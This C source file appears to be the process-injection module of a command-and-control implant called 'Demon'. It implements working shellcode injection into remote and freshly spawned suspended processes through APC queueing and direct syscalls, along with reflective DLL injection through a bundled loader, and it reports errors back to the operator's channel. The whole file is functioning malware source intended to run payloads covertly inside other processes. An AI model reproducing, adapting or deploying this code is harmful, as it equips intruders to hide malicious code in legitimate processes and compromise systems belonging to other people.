#include <Demon.h>
#include <ntstatus.h>

#include <Core/Win32.h>
#include <Core/Syscalls.h>
#include <Core/Package.h>
#include <Core/MiniStd.h>
#include <Inject/Inject.h>
#include <Inject/InjectUtil.h>
#include <Common/Macros.h>

/*
 * TODO: rewrite this entire code
 * */

BOOL ShellcodeInjectDispatch( BOOL Inject, SHORT Method, LPVOID lpShellcodeBytes, SIZE_T ShellcodeSize, PINJECTION_CTX ctx )
{
    NTSTATUS NtStatus = 0;
    BOOL     Success  = FALSE;

    if ( Inject )
    {
        PUTS( "Inject into a remote process" )

        switch ( Method )
        {
            case INJECTION_TECHNIQUE_WIN32: PUTS( "INJECTION_TECHNIQUE_WIN32" )
                {

                }

            case INJECTION_TECHNIQUE_APC: PUTS( "INJECTION_TECHNIQUE_APC" )
                {
                    HANDLE          hSnapshot   = { 0 };
                    DWORD           threadId    = 0;
                    THREADENTRY32   threadEntry = { sizeof( THREADENTRY32 ) };

                    hSnapshot = Instance.Win32.CreateToolhelp32Snapshot( TH32CS_SNAPTHREAD, 0 );

                    // TODO: change to Syscall
                    BOOL bResult = Instance.Win32.Thread32First( hSnapshot, &threadEntry );
                    while ( bResult )
                    {
                        bResult = Instance.Win32.Thread32Next( hSnapshot, &threadEntry );
                        if ( bResult )
                        {
                            if ( threadEntry.th32OwnerProcessID == ctx->ProcessID )
                            {
                                threadId = threadEntry.th32ThreadID;

                                CLIENT_ID           ProcClientID        = { 0 };
                                OBJECT_ATTRIBUTES   ObjectAttributes    = { 0 };

                                // init the attributes
                                InitializeObjectAttributes( &ObjectAttributes, NULL, 0, NULL, NULL );

                                // set the correct pid and tid
                                ProcClientID.UniqueProcess = ( HANDLE ) ( ULONG_PTR ) ctx->ProcessID;
                                ProcClientID.UniqueThread  = ( HANDLE ) ( ULONG_PTR ) threadId;

                                Instance.Win32.NtOpenThread( &ctx->hThread, MAXIMUM_ALLOWED, &ObjectAttributes, &ProcClientID );

                                break;
                            }
                        }
                    }

                    SysNtClose( hSnapshot );

                    if ( NT_SUCCESS( ( NtStatus = Instance.Win32.NtSuspendThread( ctx->hThread, NULL ) ) ) )
                    {
                        PUTS("[+] NtSuspendThread: Successful")

                        if ( ShellcodeInjectionSysApc( ctx->hProcess, lpShellcodeBytes, ShellcodeSize, ctx ) )
                        {
                            NtStatus = Instance.Win32.NtResumeThread( ctx->hThread, NULL );
                            if ( NT_SUCCESS( NtStatus ) )
                            {
                                PUTS("[+] NtResumeThread: Successful")
                                return TRUE;
                            }
                            else
                            {
                                PUTS("[-] NtResumeThread: failed")
                                goto Win32Error;
                            }
                        }
                    }
                    else
                    {
                        PUTS("[-] NtSuspendThread: failed")
                        goto Win32Error;
                    }

                Win32Error:
                    PackageTransmitError( CALLBACK_ERROR_WIN32, Instance.Win32.RtlNtStatusToDosError( NtStatus ) );

                    return FALSE;
                }

            case INJECTION_TECHNIQUE_SYSCALL:
            {
                PUTS("INJECTION_TECHNIQUE_SYSCALL")
                return ShellcodeInjectionSys( lpShellcodeBytes, ShellcodeSize, ctx );
            }
        }
    }
    else
    {
        PUTS( "Spawn and inject" )

        switch ( Method )
        {
            case INJECTION_TECHNIQUE_APC:
            {
                PUTS( "INJECTION_TECHNIQUE_APC" )

                PROCESS_INFORMATION ProcessInfo  = { 0 };
                DWORD               ProcessFlags = CREATE_SUSPENDED | CREATE_NEW_CONSOLE | CREATE_NO_WINDOW;

                if ( ProcessCreate( TRUE, NULL, Instance.Config.Process.Spawn64, ProcessFlags, &ProcessInfo, FALSE, NULL ) )
                {
                    ctx->hThread      = ProcessInfo.hThread;
                    ctx->SuspendAwake = FALSE;
                    if ( ShellcodeInjectionSysApc( ProcessInfo.hProcess, lpShellcodeBytes, ShellcodeSize, ctx ) )
                    {
                        NtStatus = Instance.Win32.NtAlertResumeThread( ProcessInfo.hThread, NULL );
                        if ( ! NT_SUCCESS( NtStatus ) )
                        {
                            PUTS( "[-] NtResumeThread: Failed" );
                            PackageTransmitError( CALLBACK_ERROR_WIN32, Instance.Win32.RtlNtStatusToDosError( NtStatus ) );
                        }
                        else
                            PUTS( "[+] NtResumeThread: Success" );

                        Success = TRUE;
                    }
                    else
                    {
                        Success = FALSE;
                    }

                    SysNtClose( ProcessInfo.hThread );
                    SysNtClose( ProcessInfo.hProcess );

                    return Success;
                }

                break;
            }

            case INJECTION_TECHNIQUE_SYSCALL:
            {
                PUTS( "INJECTION_TECHNIQUE_SYSCALL" )

                PROCESS_INFORMATION ProcessInfo  = { 0 };
                DWORD               ProcessFlags = CREATE_SUSPENDED | CREATE_NEW_CONSOLE | CREATE_NO_WINDOW;

                if ( ProcessCreate( TRUE, NULL, Instance.Config.Process.Spawn64, ProcessFlags, &ProcessInfo, FALSE, NULL ) )
                {
                    ctx->hProcess = ProcessInfo.hProcess;
                    Success = ShellcodeInjectionSys( lpShellcodeBytes, ShellcodeSize, ctx );

                    SysNtClose( ProcessInfo.hThread );
                    SysNtClose( ProcessInfo.hProcess );

                    return Success;
                }
                break;
            }

            default:
            {
                PUTS( "DEFAULT" )
                break;
            }
        }
    }

    return TRUE;
}

BOOL ShellcodeInjectionSys( LPVOID lpShellcodeBytes, SIZE_T ShellcodeSize, PINJECTION_CTX ctx )
{
    NTSTATUS NtStatus        = 0;
    LPVOID   lpVirtualMemory = NULL;
    PVOID    ShellcodeArg    = NULL;
    BOOL     Success         = FALSE;
    SIZE_T   BytesWritten    = 0;

    if ( ctx->Parameter )
    {
        ShellcodeArg = MemoryAlloc( DX_MEM_DEFAULT, ctx->hProcess, ctx->ParameterSize, PAGE_READWRITE );
        if ( ShellcodeArg )
        {
            NtStatus = Instance.Win32.NtWriteVirtualMemory( ctx->hProcess, ShellcodeArg, ctx->Parameter, ctx->ParameterSize, &BytesWritten );
            if ( ! NT_SUCCESS( NtStatus ) )
            {
                PUTS( "[-] NtWriteVirtualMemory: Failed" )
                PackageTransmitError( CALLBACK_ERROR_WIN32, Instance.Win32.RtlNtStatusToDosError( NtStatus ) );
            }
        }
    }

    // NtStatus = Instance.Win32.NtAllocateVirtualMemory( hProcess, &lpVirtualMemory, 0, &ShellcodeSize, MEM_RESERVE | MEM_COMMIT,  );
    lpVirtualMemory = MemoryAlloc( DX_MEM_DEFAULT, ctx->hProcess, ShellcodeSize, PAGE_READWRITE );
    if ( ! lpVirtualMemory )
    {
        PUTS("[-] NtAllocateVirtualMemory: failed")
        goto End;
    }
    else
        PUTS("[+] NtAllocateVirtualMemory: Successful");

    NtStatus = Instance.Win32.NtWriteVirtualMemory( ctx->hProcess, lpVirtualMemory, lpShellcodeBytes, ShellcodeSize, &ShellcodeSize );
    if ( ! NT_SUCCESS( NtStatus ) )
    {
        PUTS("[-] NtWriteVirtualMemory: failed")
        goto End;
    }
    else
        PUTS("[+] NtWriteVirtualMemory: Successful")

    // NtStatus = Instance.Win32.NtProtectVirtualMemory( hProcess, &lpVirtualMemory, &ShellcodeSize, PAGE_EXECUTE_READ, &OldProtection );
    if ( ! MemoryProtect( DX_MEM_SYSCALL, ctx->hProcess, lpVirtualMemory, ShellcodeSize, PAGE_EXECUTE_READ ) )
    {
        PUTS("[-] NtProtectVirtualMemory: failed")
        goto End;
    }
    else
        PUTS("[+] NtProtectVirtualMemory: Successful")

    ctx->Parameter = ShellcodeArg;
    if ( ThreadCreate( DX_THREAD_SYSCALL, ctx->hProcess, lpVirtualMemory, ctx ) )
    {
        PUTS( "[+] ThreadCreate: success" )
        Success = TRUE;
    }
    else
    {
        PUTS("[-] ThreadCreate: failed")
        goto End;
    }

End:
    if ( ! Success )
        PackageTransmitError( CALLBACK_ERROR_WIN32, NtGetLastError() );

    PRINTF( "Success: %s\n", Success ? "TRUE" : "FALSE" )

    return Success;
}

BOOL ShellcodeInjectionSysApc( HANDLE hProcess, LPVOID lpShellcodeBytes, SIZE_T ShellcodeSize, PINJECTION_CTX ctx )
{
    NTSTATUS    NtStatus        = 0;
    DWORD       DosError        = 0;
    LPVOID      lpVirtualMemory = NULL;
    SIZE_T      BytesWritten    = 0;
    PVOID       ShellcodeArg    = NULL;

    if ( ctx->Parameter )
    {
        ShellcodeArg = MemoryAlloc( DX_MEM_DEFAULT, hProcess, ctx->ParameterSize, PAGE_READWRITE );
        if ( ShellcodeArg )
        {
            NtStatus = Instance.Win32.NtWriteVirtualMemory( hProcess, ShellcodeArg, ctx->Parameter, ctx->ParameterSize, &BytesWritten );
            if ( ! NT_SUCCESS( NtStatus ) )
            {
                PUTS( "[-] NtWriteVirtualMemory: Failed" )
                PackageTransmitError( CALLBACK_ERROR_WIN32, Instance.Win32.RtlNtStatusToDosError( NtStatus ) );
            }
        }
    }

    lpVirtualMemory = MemoryAlloc( DX_MEM_DEFAULT, hProcess, ShellcodeSize, PAGE_READWRITE );
    if ( lpVirtualMemory )
    {
        PUTS("[+] MemoryAlloc: Successful")

        NtStatus = Instance.Win32.NtWriteVirtualMemory( hProcess, lpVirtualMemory, lpShellcodeBytes, ShellcodeSize, &ShellcodeSize );
        if ( NT_SUCCESS( NtStatus ) )
        {
            PUTS("[+] Moved memory: Successful")

            // NtStatus = Instance.Win32.NtProtectVirtualMemory( hProcess, &lpVirtualMemory, &ShellcodeSize, PAGE_EXECUTE_READ, &BytesWritten );
            if ( MemoryProtect( DX_MEM_SYSCALL, hProcess, lpVirtualMemory, ShellcodeSize, PAGE_EXECUTE_READ ) )
            {
                PUTS("[+] MemoryProtect: Successful")

                // NtStatus = Instance.Win32.NtQueueApcThread( ctx->hThread, lpVirtualMemory, ShellcodeArg, NULL, NULL );
                ctx->Parameter = ShellcodeArg;
                if ( ThreadCreate( DX_THREAD_SYSAPC, hProcess, lpVirtualMemory, ctx ) )
                {
                    PUTS( "[+] ThreadCreate: Successful" )
                    return TRUE;
                }
                else
                {
                    PUTS( "[-] ThreadCreate: failed" )
                    goto Win32Error;
                }

            } else {
                PUTS("[-] NtProtectVirtualMemory: failed")
                goto Win32Error;
            }

        } else {
            PUTS("[-] NtWriteVirtualMemory: failed")
            goto Win32Error;
        }

    } else {
        PUTS("[-] NtAllocateVirtualMemory: failed")
        goto Win32Error;
    }

Win32Error:
    DosError = Instance.Win32.RtlNtStatusToDosError( NtStatus );
    PackageTransmitError( CALLBACK_ERROR_WIN32, DosError );
    return FALSE;
}

DWORD DllInjectReflective( HANDLE hTargetProcess, LPVOID DllLdr, DWORD DllLdrSize, LPVOID DllBuffer, DWORD DllLength, PVOID Parameter, SIZE_T ParamSize, PINJECTION_CTX ctx )
{
    PRINTF( "Params( %x, %x, %d, %x )\n", hTargetProcess, DllBuffer, DllLength, ctx );

    NTSTATUS NtStatus            = STATUS_SUCCESS;
    LPVOID   MemParamsBuffer     = NULL;
    LPVOID   MemLibraryBuffer    = NULL;
    LPVOID   ReflectiveLdr       = NULL;
    LPVOID   FullDll             = NULL;
    LPVOID   MemRegion           = NULL;
    DWORD    MemRegionSize       = 0;
    DWORD    ReflectiveLdrOffset = 0;
    ULONG    FullDllSize         = 0;
    BOOL     HasRDll             = FALSE;
    DWORD    ReturnValue         = 0;
    SIZE_T   BytesWritten        = 0;

    if( ! DllBuffer || ! DllLength || ! hTargetProcess )
    {
        PUTS( "Params == NULL" )
        ReturnValue = -1;
        goto Cleanup;
    }

    if ( ProcessIsWow( hTargetProcess ) ) // check if remote process x86
    {
        if ( GetPeArch( DllBuffer ) != PROCESS_ARCH_X86 ) // check if dll is x64
        {
            PUTS( "[ERROR] trying to inject a x64 payload into a x86 process. ABORT" );
            return ERROR_INJECT_PROC_PAYLOAD_ARCH_DONT_MATCH_X64_TO_X86;
        }
    }
    else
    {
        if ( GetPeArch( DllBuffer ) != PROCESS_ARCH_X64 ) // check if dll is x64
        {
            PUTS( "[ERROR] trying to inject a x86 payload into a x64 process. ABORT" );
            return ERROR_INJECT_PROC_PAYLOAD_ARCH_DONT_MATCH_X86_TO_X64;
        }
    }

    ReflectiveLdrOffset = GetReflectiveLoaderOffset( DllBuffer );
    ReflectiveLdrOffset = 0;
    if ( ReflectiveLdrOffset )
    {
        PUTS( "The DLL has a Reflective Loader already defined" );
        HasRDll     = TRUE;
        FullDll     = DllBuffer;
        FullDllSize = DllLength;
    }
    else
    {
        PUTS( "The DLL does not have a Reflective Loader defined, using KaynLdr" );
        HasRDll     = FALSE;
        FullDll     = Instance.Win32.LocalAlloc( LPTR, DllLdrSize + DllLength );
        FullDllSize = DllLdrSize + DllLength;
        MemCopy( FullDll, DllLdr, DllLdrSize );
        MemCopy( FullDll + DllLdrSize, DllBuffer, DllLength );
    }

    PRINTF( "Reflective Loader Offset => %x\n", ReflectiveLdrOffset );

    // Alloc and write remote params
    PRINTF( "Params: Size:[%d] Pointer:[%p]\n", ParamSize, Parameter )
    if ( ParamSize > 0 )
    {
        MemParamsBuffer = MemoryAlloc( DX_MEM_DEFAULT, hTargetProcess, ParamSize, PAGE_READWRITE );
        if ( MemParamsBuffer )
        {
            PRINTF( "MemoryAlloc: Success allocated memory for parameters: ptr:[%p]\n", MemParamsBuffer )
            NtStatus = Instance.Win32.NtWriteVirtualMemory( hTargetProcess, MemParamsBuffer, Parameter, ParamSize, &BytesWritten );
            if ( ! NT_SUCCESS( NtStatus ) )
            {
                PUTS( "NtWriteVirtualMemory: Failed to write memory for parameters" )
                PackageTransmitError( CALLBACK_ERROR_WIN32, Instance.Win32.RtlNtStatusToDosError( NtStatus ) );
                ReturnValue = NtStatus;
                goto Cleanup;
            }
            else
                PUTS( "Successful wrote params into remote library memory" );
        }
        else
        {
            PUTS( "NtAllocateVirtualMemory: Failed to allocate memory for parameters" )
            PackageTransmitError( CALLBACK_ERROR_WIN32, Instance.Win32.RtlNtStatusToDosError( NtStatus ) );
            ReturnValue = -1;
            goto Cleanup;
        }
    }

    // Alloc and write remote library
    MemLibraryBuffer = MemoryAlloc( DX_MEM_DEFAULT, hTargetProcess, FullDllSize, PAGE_READWRITE );
    if ( MemLibraryBuffer )
    {
        PUTS( "[+] NtAllocateVirtualMemory: success" );
        if ( NT_SUCCESS( NtStatus = Instance.Win32.NtWriteVirtualMemory( hTargetProcess, MemLibraryBuffer, FullDll, FullDllSize, &BytesWritten ) ) )
        {
            // TODO: check to get the .text section and size of it
            PRINTF( "[+] NtWriteVirtualMemory: success: ptr[%p]\n", MemLibraryBuffer );

            ReflectiveLdr = RVA( LPVOID, MemLibraryBuffer, ReflectiveLdrOffset );
            MemRegion     = MemLibraryBuffer - ( ( ( UINT_PTR ) MemLibraryBuffer ) % 8192 );    // size of shellcode? change it to rx
            MemRegionSize = 16384;
            BytesWritten    = 0;

            // NtStatus = Instance.Win32.NtProtectVirtualMemory( hTargetProcess, &MemRegion, &MemRegionSize, PAGE_EXECUTE_READ, &OldProtect );
            if ( MemoryProtect( DX_MEM_SYSCALL, hTargetProcess, MemRegion, MemRegionSize, PAGE_EXECUTE_READ ) )
            {
                ctx->Parameter = MemParamsBuffer;
                PRINTF( "ctx->Parameter: %p\n", ctx->Parameter )

                // if ( ! ThreadCreate( ctx->Technique, hTargetProcess, ReflectiveLdr, ctx ) )
                if ( ! ThreadCreate( DX_THREAD_DEFAULT, hTargetProcess, ReflectiveLdr, ctx ) )
                {
                    PRINTF( "[-] Failed to inject dll %d\n", NtGetLastError() )
                    PackageTransmitError( CALLBACK_ERROR_WIN32, NtGetLastError() );
                    ReturnValue = -1;
                    goto Cleanup;
                }

                ReturnValue = 0;
                goto Cleanup;
            }
            else
            {
                PUTS("[-] NtProtectVirtualMemory: failed")
                PackageTransmitError( CALLBACK_ERROR_WIN32, NtGetLastError() );
                ReturnValue = -1;
                goto Cleanup;
            }
        }
        else
        {
            PRINTF( "NtWriteVirtualMemory: Failed to write memory for library [%x]\n", NtStatus )
            PackageTransmitError( 0x1, Instance.Win32.RtlNtStatusToDosError( NtStatus ) );
            ReturnValue = NtStatus;
            goto Cleanup;
        }
    }

    PRINTF( "Failed to allocate memory: %d\n", NtGetLastError() )
    ReturnValue = -1;

Cleanup:
    if ( ! HasRDll && FullDll )
    {
        MemSet( FullDll, 0, FullDllSize );
        NtHeapFree( FullDll );
        FullDll = NULL;
    }

    return ReturnValue;
}

DWORD DllSpawnReflective( LPVOID DllLdr, DWORD DllLdrSize, LPVOID DllBuffer, DWORD DllLength, PVOID Parameter, SIZE_T ParamSize, PINJECTION_CTX ctx )
{
    PRINTF( "Params( %x, %d, %x )\n", DllBuffer, DllLength, ctx );

    PROCESS_INFORMATION ProcessInfo = { 0 };
    PWCHAR              SpawnProc   = NULL;
    DWORD               Result      = 0;

    if ( GetPeArch( DllBuffer ) == PROCESS_ARCH_X86 ) // check if dll is x64
        SpawnProc = Instance.Config.Process.Spawn86;
    else
        SpawnProc = Instance.Config.Process.Spawn64;

    /* Meh this is the default */
    Result = ERROR_INJECT_FAILED_TO_SPAWN_TARGET_PROCESS;

    if ( ProcessCreate( TRUE, NULL, SpawnProc, CREATE_NO_WINDOW | CREATE_SUSPENDED, &ProcessInfo, TRUE, NULL ) )
    {
        Result = DllInjectReflective( ProcessInfo.hProcess, DllLdr, DllLdrSize, DllBuffer, DllLength, Parameter, ParamSize, ctx );
        if ( Result != 0 )
        {
            PUTS( "Failed" )

            if ( ! Instance.Win32.TerminateProcess( ProcessInfo.hProcess, 0 ) )
                PRINTF( "(Not major) Failed to Terminate Process: %d\n", NtGetLastError()  )

            SysNtClose( ProcessInfo.hProcess );
            SysNtClose( ProcessInfo.hThread );
        }
    }

    return Result;
}
